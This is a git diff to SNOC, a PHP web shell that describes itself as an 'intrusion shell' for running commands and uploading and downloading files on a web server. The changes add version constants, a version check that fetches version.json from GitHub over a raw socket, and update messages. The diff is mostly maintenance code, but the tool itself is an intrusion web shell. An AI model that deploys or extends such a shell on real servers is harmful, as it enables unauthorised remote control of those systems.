@@ -1,4 +1,8 @@
 <?php 
+
+define('SNOC_VERSION', '1.02');
+define('SNOC_CODENAME', 'Floppydisk');
+
 /**
 returns boolean if page opend as shell command
 */
@@ -22,6 +26,17 @@ function runCommand()
 	ob_end_clean();
 	// HTML Escaping with htmlentities
 	echo(base64_encode("<br/>".nl2br(htmlentities($out))));
+}
+
+/**
+ * check version
+*/
+function checkVersionCheck()
+{
+	if (isset($_POST['versionCheck'])) {
+		return true;
+	}
+	return false;
 }
 
 /**
@@ -55,6 +70,36 @@ function checkFileDownload()
 		return true;
 	}
 	return false;
+}
+
+/**
+ * do version check
+*/
+function doVersionCheck()
+{
+	$versionString = false;
+	// we open a socket because we have no guarantee that file_get_conents is enabled
+	$f = fsockopen('ssl://raw.github.com', 443);
+	$request = "GET /tjosten/SNOC/master/version.json HTTP/1.1\r\n";
+	$request.= "Host: raw.github.com\r\n";
+	$request.= "Connection: Close\r\n\r\n";
+	fwrite($f, $request);
+	while(!feof($f)) {
+		$l = fgets($f, 128);
+		if (strstr($l, '{')) {
+			$versionString = $l;
+		}
+	}
+	fclose($f);
+
+	if (!$versionString)
+		die(json_encode(array('success' => false)));
+	else
+		die($versionString);
+
+	#'https://raw.github.com/tjosten/SNOC/master/version.json';
+	#var_dump($version);
+	#echo $version;
 }
 
 /**
@@ -146,7 +191,8 @@ function echoJS()
 	};
 
 	function Shell(){
-		var snoc_version = "1.01 Brand New Beta (tm) (R)";
+		var snoc_version = "<?=SNOC_VERSION?>";
+		var snoc_version_codename = "<?=SNOC_CODENAME?>";
 		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
 		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
 		var history = new Array();				// command history stack
@@ -176,12 +222,15 @@ function echoJS()
 ' #####  #     # #######  #####  <br />'+                                
 '</pre><br />');
 
-		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br /><span style="margin-left:50px;">Version '+snoc_version+'</span><br /><br />');
+		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br /><span style="margin-left:50px;">Version '+snoc_version+' '+snoc_version_codename+'</span><br /><br />');
 	
 		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
 		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
 		"responsible for usage that results in illegal actions. We strongly advise you to use SNOC only for testing and demo "+ 
 		"purposes.<br /><br /></p>");		
+
+		// run version check
+		versionCheck();
 
 		// ------ FIRST SYS INFO
 		printShell("Current user/server setup:");
@@ -435,6 +484,23 @@ function echoJS()
 			});
 		}
 
+		// checks through "self-proxy" for new version
+		function versionCheck() {
+			$.post("",{"versionCheck":true},function(data) {
+				if (data.success == false) {
+					printShell('<br /><p style="color:red">Version check failed. Please consider manual update or try \'snocupdate\'.</p>');
+				} else {
+					console.log(data);
+					if (data.version > snoc_version) {
+						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. <br /><u>Update recommended! Type \'snocupdate\' for snoc auto update';
+					} else {
+						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. No update required.';
+					}
+					printShell('<br /><p>Installed snoc version: '+snoc_version+' '+snoc_version_codename+' - '+update_string+'</p>');
+				}
+			}, 'json');			
+		}		
+
 		// ------ EVENT HANDLERS		
 		$("#command").keydown(function(event){
 			var returnVal = true;	// some browsers need this return value set to false to prevent default behaviour
@@ -636,6 +702,10 @@ else if(checkFileUpload())
 else if(checkFileDownload())
 {
 	showFileDownload();
+}
+else if (checkVersionCheck())
+{
+	doVersionCheck();
 }
 else
 {
